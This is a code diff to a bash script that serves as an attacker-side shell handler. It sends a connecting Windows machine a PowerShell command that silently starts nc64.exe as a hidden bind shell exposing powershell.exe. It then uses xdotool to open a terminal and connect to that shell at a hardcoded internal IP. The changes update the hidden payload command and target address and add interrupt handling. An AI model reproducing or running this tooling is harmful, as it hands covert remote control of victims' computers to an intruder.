@@ -41,12 +41,12 @@ casualPort()
 
 
 listener() {
+    trap "echo -e '\n${LYELLOW}[*]${NC} ${B}Listener interrupted${NC}'; exit" SIGINT
     while true; do
         echo -e "${LYELLOW}[*]${NC} ${B}Starting listener on port 4444${NC}"
         random_port=$(casualPort)
         echo -e "${LYELLOW}[*]${NC} ${B}Random port selected: $random_port${NC}"
-
-        command="Start-Process -FilePath \"cmd.exe\" -ArgumentList \"/c start /min cmd /c nc64.exe -lp $random_port -e powershell.exe\" -WindowStyle Hidden;exit"
+        command="powershell -Command \"Start-Process -FilePath 'nc64.exe' -ArgumentList '-lp $random_port -e powershell.exe' -WindowStyle Hidden\";exit"
         echo $command | nc -lnvp 4444
         xdotool key ctrl+shift+t
         sleep 1
@@ -54,14 +54,23 @@ listener() {
         xdotool type "connection $random_port"
         xdotool key Return
         sleep 1
-        xdotool type "nc 192.168.1.43 $random_port"
+        xdotool type "nc 192.168.1.155 $random_port"
         xdotool key Return
         sleep 1
         xdotool key alt+1
+
+
+        read -t 0.1 -n 1 key
+        if [ $? -eq 0 ]; then
+            echo -e "\n${LYELLOW}[*]${NC} ${B}Interrupting listener due to key press.${NC}"
+            break
+        fi
     done
 }
+
 banner
 listener
 miniBanner  
 
 exit 0
+
